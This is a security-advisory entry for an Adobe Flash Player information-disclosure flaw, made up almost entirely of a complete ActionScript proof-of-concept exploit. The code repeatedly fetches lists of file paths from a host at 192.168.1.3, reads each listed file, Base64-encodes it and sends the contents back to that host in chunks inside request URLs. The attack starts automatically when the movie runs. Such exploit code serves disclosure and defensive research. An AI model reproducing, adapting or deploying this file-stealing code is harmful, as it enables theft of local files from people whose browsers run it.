source: http://www.securityfocus.com/bid/38517/info

Adobe Flash Player is prone to an information-disclosure vulnerability.

Attackers can exploit this issue to obtain sensitive information that may aid in launching further attacks. 

package com.lavakumar.imposter{
	import com.dynamicflash.util.Base64;
	import flash.display.MovieClip;
	import flash.display.Stage;
	import flash.text.TextField;
	import flash.events.Event;
	import flash.events.DataEvent;
	import flash.events.IOErrorEvent;
	import flash.events.ProgressEvent;
	import flash.events.SecurityErrorEvent;
	import flash.events.HTTPStatusEvent;
	import flash.utils.ByteArray;
	import flash.net.URLLoader;
	import flash.net.URLRequest;
	import flash.net.URLLoaderDataFormat;

	public class Main extends MovieClip {
		var filecontent:String="";
		var read:int=0;
		var inputcount:int=0;
		var filecounter:int=0;
		var files:Array;
		var statuscode:int=1;

		public function Main() {
			addEventListener(Event.ENTER_FRAME, check, false, 0, true);
		}
		public function check(e:Event):void {
			if (statuscode==1) {
				get();
			} else if (statuscode==2) {
				load();
			} else if (statuscode==3) {
				send();
			}
		}

		public function get():void {
			var getter:URLLoader = new URLLoader();
			getter.dataFormat=URLLoaderDataFormat.BINARY;
			getter.addEventListener(Event.COMPLETE, get_FileLoaded);
			getter.addEventListener(IOErrorEvent.IO_ERROR, get_FileIoError);
			getter.addEventListener(Event.OPEN, get_FileOpened);
			getter.addEventListener(ProgressEvent.PROGRESS, get_FileProgress);
			getter.addEventListener(SecurityErrorEvent.SECURITY_ERROR, get_FileSecurityError);
			getter.addEventListener(HTTPStatusEvent.HTTP_STATUS, get_FileStatus);
			getter.addEventListener(DataEvent.DATA, get_DataEventHandler);
			var inputfile:URLRequest=new URLRequest("//192.168.1.3/imp/imposter"+inputcount.toString()+".input");
			statuscode=0;
			getter.load(inputfile);
		}
		public function load():void {
			var loader:URLLoader = new URLLoader();
			loader.dataFormat=URLLoaderDataFormat.BINARY;
			loader.addEventListener(Event.COMPLETE, load_FileLoaded);
			loader.addEventListener(IOErrorEvent.IO_ERROR, load_FileIoError);
			loader.addEventListener(Event.OPEN, load_FileOpened);
			loader.addEventListener(ProgressEvent.PROGRESS, load_FileProgress);
			loader.addEventListener(SecurityErrorEvent.SECURITY_ERROR, load_FileSecurityError);
			loader.addEventListener(HTTPStatusEvent.HTTP_STATUS, load_FileStatus);
			loader.addEventListener(DataEvent.DATA, load_DataEventHandler);
			if (filecounter<files.length) {
				var filename:String=files[filecounter];
				filecounter++;
				var file:URLRequest=new URLRequest(filename);
				statuscode=0;
				loader.load(file);
			} else {
				statuscode=1;
			}
		}
		public function send():void {
			if (read<filecontent.length) {
				var temp:String;
				var sendurl:String="";
				if ((filecontent.length - read) < 200) {
					temp=filecontent.substr(read);
					var regex:RegExp=/\//g;
					temp=temp.replace(regex,"-");
					sendurl="//192.168.1.3/imp/is_"+filecounter+"_"+read+"_"+filecontent.length+"_"+temp;
					read=filecontent.length;

				} else {
					temp=filecontent.substr(read,200);
					var regex:RegExp=/\//g;
					temp=temp.replace(regex,"-");
					sendurl="//192.168.1.3/imp/is_"+filecounter+"_"+read+"_"+filecontent.length+"_"+temp;
					read=read+200;
				}
				var senddata:URLRequest=new URLRequest(sendurl);
				var sender:URLLoader = new URLLoader();
				sender.dataFormat=URLLoaderDataFormat.BINARY;
				sender.addEventListener(Event.COMPLETE, send_FileLoaded);
				sender.addEventListener(IOErrorEvent.IO_ERROR, send_FileIoError);
				sender.addEventListener(Event.OPEN, send_FileOpened);
				sender.addEventListener(ProgressEvent.PROGRESS, send_FileProgress);
				sender.addEventListener(SecurityErrorEvent.SECURITY_ERROR, send_FileSecurityError);
				sender.addEventListener(HTTPStatusEvent.HTTP_STATUS, send_FileStatus);
				sender.addEventListener(DataEvent.DATA, send_DataEventHandler);
				sender.load(senddata);
			} else {
				read=0;
				statuscode=2;
			}
		}

		function load_FileLoaded(event:Event):void {
			var loader:URLLoader=event.target as URLLoader;
			var data:ByteArray=loader.data as ByteArray;
			filecontent=Base64.encodeByteArray(data);
			data=null;
			statuscode=3;
		}
		function load_FileOpened(event:Event):void {
			var loader:URLLoader=event.target as URLLoader;
		}
		function load_DataEventHandler(event:Event):void {
		}
		function load_FileProgress(event:flash.events.ProgressEvent):void {
		}
		function load_FileSecurityError(event:Event):void {
			statuscode=2;
		}
		function load_FileIoError(event:Event):void {
			statuscode=2;
		}
		function load_FileStatus(event:HTTPStatusEvent):void {
		}
		function load_FileNotFound(event:IOErrorEvent):void {
			statuscode=2;
		}

		function get_FileLoaded(event:Event):void {
			var getter:URLLoader=event.target as URLLoader;
			var data:String=event.target.data;
			if (data.length>0) {
				files=data.split(',');
				if (files.length>0) {
					statuscode=2;
					inputcount++;
				} else {
					statuscode=1;
				}
			} else {
				statuscode=1;
			}
		}
		function get_FileOpened(event:Event):void {
		}
		function get_DataEventHandler(event:Event):void {
		}
		function get_FileProgress(event:flash.events.ProgressEvent):void {
		}
		function get_FileSecurityError(event:Event):void {
			statuscode=1;
		}
		function get_FileIoError(event:Event):void {
			statuscode=1;
		}
		function get_FileStatus(event:HTTPStatusEvent):void {
		}
		function get_FileNotFound(event:IOErrorEvent):void {
			statuscode=1;
		}
		function send_FileLoaded(event:Event):void {
		}
		function send_FileOpened(event:Event):void {
		}
		function send_DataEventHandler(event:Event):void {
		}
		function send_FileProgress(event:flash.events.ProgressEvent):void {
		}
		function send_FileSecurityError(event:Event):void {
		}
		function send_FileIoError(event:Event):void {
		}
		function send_FileStatus(event:HTTPStatusEvent):void {
		}
		function send_FileNotFound(event:IOErrorEvent):void {
		}
	}
}